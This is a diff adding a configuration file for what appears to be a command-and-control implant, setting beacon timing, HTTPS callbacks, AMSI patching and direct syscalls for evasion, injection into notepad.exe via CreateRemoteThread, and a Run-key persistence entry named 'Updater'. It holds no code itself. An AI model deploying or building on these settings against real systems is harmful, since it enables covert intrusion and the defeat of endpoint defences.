@@ -1,0 +1,23 @@
+[implant]
+sleep_ms = 5000
+jitter_pct = 10
+protocol = "https"
+user_agent = "JebatAgent/1.0"
+
+[evasion]
+unhook_ntdll = false
+patch_amsi = true
+patch_etw = false
+syscall_mode = "direct"
+
+[inject]
+method = "create_remote_thread"
+target = "notepad.exe"
+
+[persist]
+method = "registry_run"
+name = "Updater"
+
+[comms]
+beacon_path = "/beacon"
+result_path = "/result"
